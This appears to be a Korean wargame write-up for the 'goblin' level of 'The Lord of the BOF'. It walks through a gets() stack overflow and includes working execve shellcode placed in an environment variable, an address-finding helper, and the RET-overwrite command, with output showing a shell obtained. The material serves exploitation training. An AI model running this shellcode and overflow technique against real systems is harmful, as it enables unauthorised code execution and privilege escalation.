============================================================================================================
[lob] cobolt
============================================================================================================


.. uml::
    
    @startuml

    start

    :Source Analysis;

    :Memory Structure;

    :Segmentation fault;

    :환경 변수 쉘코드 등록;

    :환경 변수 주소값 확인;

    :RET 주소를 환경 변수 주소로 변경하여 공격 진행;
    
    stop

    @enduml

|

Source Analysis
============================================================================================================

해당 문제 소스코드는 다음과 같습니다.

.. code-block:: c

    /*
        The Lord of the BOF : The Fellowship of the BOF
        - goblin
        - small buffer + stdin
    */

    int main()
    {
        char buffer[16];
        gets(buffer);
        printf("%s\n", buffer);
    }


|

Memory Structure
============================================================================================================

스택 메모리 공간에 다음과 같이 들어가게 됩니다.

.. code-block:: console

    ===============
    LOW     
    ---------------
    Buffer  (16byte) <- gets
    SFP     (4byte)
    RET     (4byte)
    ---------------
    HIGH    
    ===============

|

Segmentation fault
============================================================================================================

gets로 인해 입력한 값이 버퍼보다 클 경우 오버플로우가 발생됩니다.

※ 시작시 bash2 명령을 입력하고 bash2 쉘 상태에서 진행해야 합니다.

.. code-block:: console

    $ ./goblin
    aaaaaaaaaaaaaaaa

    aaaaaaaaaaaaaaaa

    $ ./goblin
    aaaaaaaaaaaaaaaaaaaa

    aaaaaaaaaaaaaaaaaaaa
    Segmentation fault

|

exploit
============================================================================================================

환경 변수 쉘코드 등록
------------------------------------------------------------------------------------------------------------

환경 변수에 쉘코드를 등록해두고, 입력값 마지막 리턴 주소를 환경 변수 주소로 변경하여 해당 쉘코드를 실행하도록 합니다.

.. code-block:: console

    $ export shellcode=`python -c 'print "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`

|

환경 변수 주소값 확인
------------------------------------------------------------------------------------------------------------

다음과 같이 소스코드를 작성하여 shellcode 환경 변수에 대한 주소 값을 획득합니다.

.. code-block:: c

    #include <stdio.h>
    int main(int argc, char **argv)
    {
            char *addr;
            addr = getenv(argv[1]);
            printf("address %p\n", addr);
            return 0;
    }

.. code-block:: console

    $ gcc -o get get.c

    get.c: In function `main':
    get.c:6: warning: assignment makes pointer from integer without a cast

    $ ./get shellcode

    address 0xbfffff02

|

RET 주소를 환경 변수 주소로 변경하여 공격 진행
------------------------------------------------------------------------------------------------------------

.. code-block:: console

    ===============
    LOW     
    ---------------
    Buffer  (16byte) <- "\x90"*16
    SFP     (4byte)  <- "\x90"*4
    RET     (4byte)  <- shellcode 환경 변수 주소
    ---------------
    HIGH    
    ===============

오버플로우시 RET 주소를 환경 변수 주소로 변경하여 해당 쉘코드가 실행되도록 합니다. gets의 경우 프로그램 실행 이후 값이 입력되어야 하기 때문에 다음 형식으로 변수를 입력합니다.

.. code-block:: console

    $ (python -c 'print "a"*20+"\x01\xff\xff\xbf"';cat) |./goblin
    aaaaaaaaaaaaaaaaaaaa▒▒▒

    whoami
    goblin
    my-pass
    euid = 503
    hackers proof
